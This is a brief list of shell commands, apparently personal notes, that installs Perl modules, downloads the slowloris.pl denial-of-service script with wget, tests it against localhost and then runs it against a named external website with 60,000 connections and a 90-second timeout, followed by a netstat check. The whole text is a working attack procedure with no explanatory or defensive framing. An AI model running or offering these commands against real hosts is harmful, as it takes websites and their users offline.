

yum -y install perl perl-IO-Socket-SSL perl-libwww-perl

wget http://ha.ckers.org/slowloris/slowloris.pl

perl slowloris.pl -dns 127.0.0.1 -port 80 -test

perl slowloris.pl -dns www.aiso-doc.com -port 80 -timeout 90 -num 60000

netstat -tcn | grep 192.168.88.52 | grep -v ':2245'
